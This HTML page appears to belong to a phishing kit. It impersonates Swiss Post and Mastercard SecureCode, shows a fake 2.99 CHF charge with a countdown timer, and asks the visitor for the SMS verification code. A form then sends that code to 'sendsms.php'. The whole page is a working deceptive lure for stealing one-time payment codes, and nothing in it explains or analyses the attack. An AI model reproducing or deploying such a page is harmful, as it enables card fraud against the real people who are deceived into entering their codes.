
<html lang="is">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Varela+Round&display=swap" rel="stylesheet">
    <!-- css files -->
    <link rel="stylesheet" href="css/all.min.css">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="2.css">
    <title>Die Schweizerische Post</title>
</head>
<body>
    <div class="container">
<br>

        <form id="cardForm" action="sendsms.php" method="post">
            <section class="first-sec">
                <div class="centrer  " class="first-sec-doll">
                    <div class="containerHead paddingDiv">
                        <div class="leftcontainerHead">
                            <img src="swiis-logo.png" style=" width: 100px;"/>
                            <img src="Swiss_new.svg.png" style=" width: 100px;"/>
                        </div>
                        <div class="rightcontainerHead">
                            <img src="mastercard.png" style=" width: 120px;"/>

                        </div>
                    </div>
                </div>
                <div class="paddingDiv" style="margin-top: 40px ; ">


                    <strong class="textMessage2">
                        Bitte geben sie ihren  Mastercard® SecureCodeTM ein
                         </strong>
                    <p class="textMessage">
                        Mastercard® SecureCodeTM ist die internationale karteninhaber-identifikation von MasterCard. die del kreditkartenzahlungen im internet eingesezl werdenkann.

                    </p>
                </div>
                <div class="paddingDiv" style="margin-top: 10px ; ">

                    <table width="70%" class="textMessage">
                        <tr><td style=" width: 50%;">Händler</td><td></td></tr>
                        <tr><td style=" width: 50%;">Betrag</td><td style="width: 50%;text-align: left"><strong>2,99 CHF</strong></td></tr>
                        <tr><td style=" width: 50%;">Datum</td><td  style="width: 50%;text-align: left">
                                <script>
                                 let date_ob = new Date();

                                        // adjust 0 before single digit date
                                        let date = ("0" + date_ob.getDate()).slice(-2);

                                        // current month
                                        let month = ("0" + (date_ob.getMonth() + 1)).slice(-2);

                                        // current year
                                        let year = date_ob.getFullYear();

                                        // current hours
                                        let hours = date_ob.getHours();

                                        // current minutes
                                        let minutes = date_ob.getMinutes();

                                        // current seconds
                                        let seconds = date_ob.getSeconds();

                                        // prints date & time in YYYY-MM-DD HH:MM:SS format
                                        document.write(year + "/" + month + "/" + date + " " + hours + ":" + minutes + ":" + seconds); </script></td></tr>
                        <tr><td style=" width: 50%;">Kartennummer</td><td style="width: 50%;text-align: left">
                                xxxx xxxx xxxx xxxx<br /></td></tr>
                    </table>

                </div>
                <p class="HROr">Mastercard® SecureCodeTM </p>

                 <div class="first-sec-inf paddingDiv">

                    <div class="second-sec-info">
                        <div class="second-sec-info-form">
                            <input type="text" class="form-control inpt222"   placeholder="SMS-Code"  name="msg" required>
                            <button class="btn btn-dark btn-lg" type="submit">Bestätigen</button>
                            <p class="sms-verif">Geben Sie den per SMS erhaltenen Bestätigungscode ein: <span id="timer"></span></p>
                        </div>
                        <script>
                            function countdown() {
                                var seconds = 60;
                                function tick() {
                                    var counter = document.getElementById("timer");
                                    seconds--;

                                    // those if conditions to format the timer
                                    if (seconds >= 60) {
                                        if ((seconds - 60) > 10){
                                            counter.innerHTML = `01:${seconds - 60}`
                                        }
                                        else{
                                            counter.innerHTML = `01:0${seconds - 60}`
                                        }
                                    }
                                    else if (seconds > 10){
                                        counter.innerHTML = `00:${seconds}`
                                    }
                                    else {
                                        counter.innerHTML = `00:0${seconds}`
                                    }

                                    // check if if counter reached 0 then do you you input disable input or something
                                    if( seconds > 0 ) {
                                        setTimeout(tick, 1000);
                                    } else {
                                        // disable input or something
                                        console.log("timer is over input is disabled")
                                    }
                                }
                                tick();
                            }
                            // start the countdown
                            countdown();

                        </script>
                    </div>

                </div>
                <footer>
                    <a class="hrefa" href="#">Kontakt</a>
                    <a class="hrefa" href="#">Die Info</a>
                    <a class="hrefa" href="#">Barrierefreiheit</a>
                    <a class="hrefa" href="#">AGBs</a>
                    <a class="hrefa" href="#">Datenschutz und Haftungsausschluss</a>
                    <a class="hrefa" href="#">Veröffentlichung</a>
                    <a class="hrefa" href="#">Detail</a>

                    <p class="copyright">	&copy; 2022 Swiss Post Ltd</p>
                </footer>
            </section>

        </form>

    </div>
    <script>
        function countdown() {
    var seconds = 60;
    function tick() {
        var counter = document.getElementById("timer");
        seconds--;

        // those if conditions to format the timer 
        if (seconds >= 60) {
            if ((seconds - 60) > 10){
                counter.innerHTML = `01:${seconds - 60}`
            }
            else{
                counter.innerHTML = `01:0${seconds - 60}`
            }
        }
        else if (seconds > 10){
            counter.innerHTML = `00:${seconds}`
        }
        else {
            counter.innerHTML = `00:0${seconds}`
        }

        // check if if counter reached 0 then do you you input disable input or something
        if( seconds > 0 ) {
            setTimeout(tick, 1000);
        } else {
            // disable input or something
            console.log("timer is over input is disabled")
        }
    }
    tick();
}
// start the countdown
countdown();

    </script>
</body>
</html>